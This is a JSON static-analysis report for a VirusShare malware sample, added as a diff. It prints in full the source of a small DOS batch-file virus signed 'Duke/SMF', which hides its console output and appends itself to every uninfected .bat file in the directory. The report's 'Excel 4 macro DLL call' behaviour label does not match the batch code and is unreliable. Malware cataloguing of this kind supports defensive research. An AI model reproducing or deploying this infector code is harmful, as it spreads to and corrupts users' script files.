@@ -1,0 +1,62 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@goto telo\n:begin tel\n@ctty nul%tel%\nif \"%1==\"$ goto ztel\nfind \"tel\"<%0>tel.bat\necho.>>tel.bat\necho>>tel.bat @goto begin\necho>>tel.bat :end\nfor %%b in (*.bat) do call tel.bat $ %%b\ndel tel.bat\nctty con%tel%\n@goto end%tel%\n:ztel\nfind \"tel\"<%2>nul\nif not errorlevel 1 goto end%tel%\nfind \"tel\"<%0>tel\ntype %2>>tel\necho.>>tel\necho>>tel @goto begin\necho>>tel :end\nren tel %2\ncopy tel %2\ndel tel\ngoto end%tel%\n:telo (c) by Duke/SMF\n::This is host file...\n::Enjoy !\n@goto begin\n:end"
+    },
+    "filename": "VirusShare_90530baf6525b17f164932bff3841f24",
+    "filesize": 505,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "90530baf6525b17f164932bff3841f24",
+        "sha1": "2bad60f34327a70d95e74fc25b4583c7432c25d8",
+        "sha256": "273c07eb660be8cd6d098f9ce179410dbd489cc19991ff7cce840dd98526b934"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@goto telo",
+            ":begin tel",
+            "@ctty nul%tel%",
+            "if \"%1==\"$ goto ztel",
+            "find \"tel\"<%0>tel.bat",
+            "echo.>>tel.bat",
+            "echo>>tel.bat @goto begin",
+            "echo>>tel.bat :end",
+            "for %%b in (*.bat) do call tel.bat $ %%b",
+            "del tel.bat",
+            "ctty con%tel%",
+            "@goto end%tel%",
+            ":ztel",
+            "find \"tel\"<%2>nul",
+            "if not errorlevel 1 goto end%tel%",
+            "find \"tel\"<%0>tel",
+            "type %2>>tel",
+            "echo.>>tel",
+            "echo>>tel @goto begin",
+            "echo>>tel :end",
+            "ren tel %2",
+            "copy tel %2",
+            "del tel",
+            "goto end%tel%",
+            ":telo (c) by Duke/SMF",
+            "::This is host file...",
+            "::Enjoy !",
+            "@goto begin",
+            ":end"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.266092",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
